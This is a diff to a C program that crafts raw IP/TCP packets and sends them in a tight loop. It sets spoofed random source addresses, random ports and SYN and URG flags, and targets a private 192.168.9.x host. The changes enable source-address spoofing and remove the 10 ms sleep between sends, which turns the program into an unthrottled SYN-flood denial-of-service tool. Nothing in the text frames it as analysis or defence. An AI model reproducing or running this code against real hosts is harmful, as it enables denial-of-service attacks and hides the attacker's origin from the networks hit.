@@ -135,15 +135,33 @@ int main(int argc, const char *argv[])
                 ih->protocol = 6;
                 /* ih->sum = 0; */
                 /* getrandom(0, 65535), no need hton */
-                /* ih->saddr = getrandom(0, 65535) + (getrandom(0, 65535) << 16); */
+                /* ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 16); */
+                ih->saddr = getrandom(0, 65536) + (getrandom(0, 65535) << 8);
+                /* ih->saddr = getrandom(0, 65536); */
                 /* ih->saddr = 1946746880 + getrandom(0, 65535); */
                 /* ih->saddr = 1711909056; */
-                /* 255.255.255.127 */
-                /* ih->saddr = 2147483647; */
+                /* ih->saddr = 67741888; */
+                /* 192.168.9.130 */
+                /* ih->saddr = 2181671104; */
+                /* 192.168.9.30 */
+                /* ih->saddr = 503949504; */
                 /* 0.0.0.128 */
                 /* ih->saddr = 2147483648; */
+                /* 192.168.10.10 */
+                /* ih->saddr = 168470720; */
+                /* 192.168.10.254 */
+                /* ih->saddr = 50574016; */
+
+                /* 192.168.9.4 */
+                /* ih->daddr = 67741888; */
+                /* 192.168.9.14 */
+                /* ih->daddr = 235514048; */
+                /* 192.168.9.141 */
+                ih->daddr = 2366220480;
+                /* 192.168.9.15 */
+                /* ih->daddr = 252291264; */
                 /* 192.168.9.117 */
-                ih->daddr = 1963567296;
+                /* ih->daddr = 1963567296; */
                 th->source = getrandom(0, 65535);
                 th->dest = getrandom(0, 65535);
                 th->seq = getrandom(0, 65535) + (getrandom(0, 65535) << 8);
@@ -156,6 +174,7 @@ int main(int argc, const char *argv[])
 #endif
                 th->syn = 1;
                 th->urg = 1;
+                /* th->rst = 1; */
                 th->check = 0;
                 /* 4 * 5 = 20 bytes */
                 th->doff = 5;
@@ -184,22 +203,22 @@ int main(int argc, const char *argv[])
                 printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 8));
                 printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 12));
                 printf(D_RED "0x%x\n" D_NONE, *(unsigned *)((char *)th + 16));
-#endif
                 for (i = 0; i < DATASIZE; ++i) {
                         /* 40 for ip & tcp header */
                         buf[40 + i] = 0x61 + i;
                 }
-                addr.s_addr = ih->saddr;
-                printf("%u\t\t%s\n", ih->saddr, inet_ntoa(addr));
+#endif
+                /* addr.s_addr = ih->saddr; */
+                /* printf("%u\t\t%s\n", ih->saddr, inet_ntoa(addr)); */
                 /* ip->tot_len is net order now */
-                /* ret = sendto(skfd, buf, 40 + DATASIZE, 0, (struct sockaddr *)&sin, sizeof(sin)); */
-                ret = sendto(skfd, buf, 40 + getrandom(0, 100), 0, (struct sockaddr *)&sin, sizeof(sin));
+                ret = sendto(skfd, buf, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
+                /* ret = sendto(skfd, buf, 40 + getrandom(0, 1000), 0, (struct sockaddr *)&sin, sizeof(sin)); */
                 if (ret < 0) {
                         perror("sendto ");
                 } else {
                         /* fprintf(stderr, "%d bytes sent\n", ret); */
                 }
-                msleep(10);
+                /* msleep(1); */
                 /* sleep(1); */
         }
         return 0;
